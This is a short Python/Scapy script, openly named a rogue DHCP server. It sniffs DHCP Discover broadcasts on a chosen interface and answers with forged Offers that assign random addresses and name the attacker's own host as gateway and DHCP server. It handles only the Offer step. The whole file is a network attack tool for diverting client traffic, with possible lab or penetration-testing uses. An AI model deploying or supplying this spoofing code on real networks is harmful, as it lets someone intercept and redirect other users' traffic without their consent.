#!/usr/bin/env python3
from scapy.all import *
import random

def rogue_dhcp_server(interface="ens224"):
    print(f"[*] Rogue DHCP Server listening on {interface}...")

    def handle_packet(pkt):
        # Check for DHCP Discover (message-type 1)
        if pkt.haslayer(DHCP):
            for opt in pkt[DHCP].options:
                if isinstance(opt, tuple) and opt[0] == 'message-type' and opt[1] == 1:
                    
                    mac = pkt[Ether].src
                    xid = pkt[BOOTP].xid
                    
                    # IP to offer
                    offered_ip = f"192.168.189.{random.randint(50, 100)}"
                    
                    print(f"[*] Received Discover from {mac} (xid={xid}), offering {offered_ip}")

                    # Build Offer
                    pkt_offer = (
                        Ether(dst="ff:ff:ff:ff:ff:ff", src=get_if_hwaddr(interface)) /
                        IP(src="192.168.189.128", dst="255.255.255.255") /
                        UDP(sport=67, dport=68) /
                        BOOTP(op=2, yiaddr=offered_ip, siaddr="192.168.189.128", xid=xid, chaddr=mac) /
                        DHCP(options=[
                            ("message-type", "offer"),
                            ("server_id", "192.168.189.128"),
                            ("subnet_mask", "255.255.255.0"),
                            ("router", "192.168.189.128"),
                            ("name_server", "8.8.8.8"),
                            ("lease_time", 3600),
                            "end"
                        ])
                    )
                    
                    sendp(pkt_offer, iface=interface, verbose=False)
                    return

    sniff(iface=interface, filter="udp and port 67", prn=handle_packet)

if __name__ == "__main__":
    import sys
    interface = sys.argv[1] if len(sys.argv) > 1 else "ens224"
    rogue_dhcp_server(interface)
